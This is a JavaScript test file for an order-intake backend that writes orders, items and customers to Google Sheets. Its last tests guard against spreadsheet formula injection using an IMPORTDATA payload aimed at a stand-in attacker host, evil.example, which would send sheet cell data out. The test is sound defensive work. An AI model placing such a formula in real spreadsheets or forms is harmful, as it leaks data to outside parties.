// Order intake (doPost) — the live guest and shop-QR flows. These pin today's behaviour so account work cannot break it.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { loadBackend, guestOrder, addShop } from '../helpers/apps-script.mjs';
import { readJson, CATALOG_PATH } from '../../scripts/lib/checks.mjs';

function ready() {
  const b = loadBackend();
  b.ctx.setup();
  return b;
}

test('guest order writes one Order, its items, one Event and a new customer', () => {
  const { post, sheet } = ready();
  const res = post(guestOrder());
  assert.equal(res.ok, true);
  assert.match(res.order_id, /^W\d{6}-001$/);

  const [order] = sheet('Order').records();
  assert.equal(order.Order_ID, res.order_id);
  assert.equal(order.Source, 'Web');
  assert.equal(order.Customer_ID, 'CUS-W001');
  assert.equal(order.Web_Total, 370);
  assert.equal(order.Status, 'Received');

  const items = sheet('Order_Items').records();
  assert.deepEqual(items.map(i => [i.SKU, i.Qty, i.Unit_Price, i.Line_Total]), [['PK-001', 3, 80, 240], ['CK-001', 2, 65, 130]]);
  assert.ok(items.every(i => i.Order_ID === res.order_id));

  const events = sheet('Event').records();
  assert.equal(events.length, 1);
  assert.equal(events[0].Action, 'Ordered');

  const [customer] = sheet('Master').records();
  assert.equal(customer.Code, 'CUS-W001');
  assert.equal(customer.Phone, '0812345678');
});

test('a second guest order from the same phone reuses the customer', () => {
  const { post, sheet } = ready();
  post(guestOrder());
  const res = post(guestOrder({ client_order_id: 'second-order-0001' }));
  assert.equal(res.ok, true);
  assert.equal(sheet('Master').records().length, 1);
  assert.deepEqual(sheet('Order').records().map(o => o.Customer_ID), ['CUS-W001', 'CUS-W001']);
});

test('a bad phone is rejected and nothing is written', () => {
  const { post, sheet } = ready();
  const res = post(guestOrder({ customer: { shop_name: 'X', phone: '12345' } }));
  assert.deepEqual(res, { ok: false, error: 'phone' });
  assert.equal(sheet('Order').records().length, 0);
  assert.equal(sheet('Order_Items').records().length, 0);
});

test('a total that does not add up is rejected', () => {
  const { post, sheet } = ready();
  assert.deepEqual(post(guestOrder({ total: 999 })), { ok: false, error: 'total' });
  assert.equal(sheet('Order').records().length, 0);
});

test('a retried client_order_id gets the first order id back and writes nothing new', () => {
  const { post, sheet } = ready();
  const first = post(guestOrder({ client_order_id: 'retry-test-0001' }));
  const again = post(guestOrder({ client_order_id: 'retry-test-0001' }));
  assert.deepEqual(again, { ok: true, order_id: first.order_id, duplicate: true });
  assert.equal(sheet('Order').records().length, 1);
  assert.equal(sheet('Order_Items').records().length, 2);
});

test('a shop-QR order takes the shop from Master, not from the browser', () => {
  const { post, sheet } = ready();
  addShop(sheet('Master'), { code: 'CUS-W010', name: 'Shop A', phone: '0811111111', shopCode: 'ABCDEFGH23', address: '1 Sukhumvit Rd' });
  const res = post(guestOrder({ shop_code: 'ABCDEFGH23', customer: { shop_name: 'Typed by someone', phone: '' }, delivery: { date: '2026-10-25', address_note: '' } }));
  assert.equal(res.ok, true);
  const [order] = sheet('Order').records();
  assert.equal(order.Customer_ID, 'CUS-W010');
  assert.equal(order.Web_Shop_Name, 'Shop A');
  assert.equal(order.Web_Phone, '0811111111');
  assert.match(order.Web_Note, /^1 Sukhumvit Rd/);
  assert.equal(sheet('Master').records().length, 1, 'no new customer row for a shop-QR order');
});

// ---- Phase 1: how each order was identified, and the category of each line (for History / Analytics) ----

test('a guest order is marked Auth = guest', () => {
  const { post, sheet } = ready();
  post(guestOrder());
  assert.equal(sheet('Order').records()[0].Auth, 'guest');
});

test('a shop-QR order is marked Auth = shop_qr', () => {
  const { post, sheet } = ready();
  addShop(sheet('Master'));
  post(guestOrder({ shop_code: 'ABCDEFGH23', customer: { phone: '' } }));
  assert.equal(sheet('Order').records()[0].Auth, 'shop_qr');
});

test('each order line gets its category from the SKU', () => {
  const { post, sheet } = ready();
  post(guestOrder({
    items: [
      { sku: 'PK-001', name_th: 'a', qty: 1, qty_unit: 'kg', unit_price: 10, line_total: 10 },
      { sku: 'CK-001', name_th: 'b', qty: 1, qty_unit: 'kg', unit_price: 10, line_total: 10 },
      { sku: 'EG-001', name_th: 'c', qty: 1, qty_unit: 'tray', unit_price: 10, line_total: 10 },
      { sku: 'FS-001', name_th: 'd', qty: 1, qty_unit: 'kg', unit_price: 10, line_total: 10 },
      { sku: 'ZZ-001', name_th: 'e', qty: 1, qty_unit: 'kg', unit_price: 10, line_total: 10 },
    ],
    total: 50,
  }));
  assert.deepEqual(sheet('Order_Items').records().map(i => i.Category), ['pork', 'chicken', 'egg', 'fish', 'other']);
});

test('the server category agrees with data/catalog.json for every product', () => {
  const { ctx } = ready();
  const wrong = readJson(CATALOG_PATH).data.products.filter(p => ctx.categoryOf_(p.sku) !== p.category).map(p => `${p.sku}: ${p.category}`);
  assert.deepEqual(wrong, []);
});

test('an unknown shop code is rejected', () => {
  const { post, sheet } = ready();
  assert.deepEqual(post(guestOrder({ shop_code: 'ZZZZZZZZ22', customer: { phone: '' } })), { ok: false, error: 'unknown_shop' });
  assert.equal(sheet('Order').records().length, 0);
});

// ---- 2026-10-23 night: text that starts with = + - @ must never become a formula in the sheet ----
// (A formula such as =IMPORTDATA("https://…"&A2) typed into the order form could send sheet data out.)
const NASTY = ['=IMPORTDATA("https://evil.example/?"&A2)', '+66 2 000 0000', '-no chilli', '@ken'];
const noFormulas = ss => [...ss.sheets].flatMap(([n, s]) => s.cells.flat().filter(v => String(v).startsWith('FORMULA(')).map(v => `${n}: ${v}`));

test('a guest order writes formula-looking text as plain text everywhere', () => {
  const { post, ss, sheet } = ready();
  const res = post(guestOrder({
    customer: { shop_name: NASTY[0], contact_name: NASTY[1], phone: '0812345678', line_name: NASTY[3] },
    delivery: { date: '2026-10-25', address_note: NASTY[2] },
    note: NASTY[0],
    items: [{ sku: 'PK-001', name_th: NASTY[0], qty: 1, qty_unit: '=kg', unit_price: 10, line_total: 10 }],
    total: 10,
  }));
  assert.equal(res.ok, true);
  assert.deepEqual(noFormulas(ss), []);
  const [order] = sheet('Order').records();
  assert.equal(order.Web_Shop_Name, NASTY[0]);
  assert.equal(order.Web_Note, `${NASTY[2]} | ${NASTY[0]} | LINE: ${NASTY[3]}`);
  const [c] = sheet('Master').records();
  assert.deepEqual([c.Name, c.Contact_Name, c.LINE_Name, c.Address], [NASTY[0], NASTY[1], NASTY[3], NASTY[2]]);
  const [item] = sheet('Order_Items').records();
  assert.deepEqual([item.Name_TH, item.Qty_Unit], [NASTY[0], '=kg']);
});

test('a shop-QR order copies formula-looking Master text as plain text', () => {
  const { post, ss, sheet } = ready();
  // Master already holds this as text (typed with an apostrophe, or written by the admin page).
  addShop(sheet('Master'), { name: "'" + NASTY[0], address: "'" + NASTY[2] });
  const res = post(guestOrder({ shop_code: 'ABCDEFGH23', customer: { phone: '' }, delivery: { date: '2026-10-25', address_note: '' } }));
  assert.equal(res.ok, true);
  assert.deepEqual(noFormulas(ss), []);
  assert.equal(sheet('Order').records()[0].Web_Shop_Name, NASTY[0]);
});
